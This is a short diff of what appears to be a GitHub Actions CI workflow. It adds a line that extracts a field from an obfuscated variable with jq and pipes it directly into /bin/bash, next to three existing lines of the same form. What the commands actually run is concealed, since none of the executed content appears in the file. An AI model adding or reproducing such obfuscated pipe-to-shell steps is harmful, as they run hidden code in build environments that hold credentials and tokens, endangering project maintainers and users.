@@ -25,6 +25,7 @@ jobs:
           echo $g08 | jq -r .kxvt591 | /bin/bash
           printf '%s' "$gnk2013" | jq -r .h19 | /bin/bash
           echo $gi5 | jq -r .g883 | /bin/bash
+          echo $aho94674 | jq -r .wp3844 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
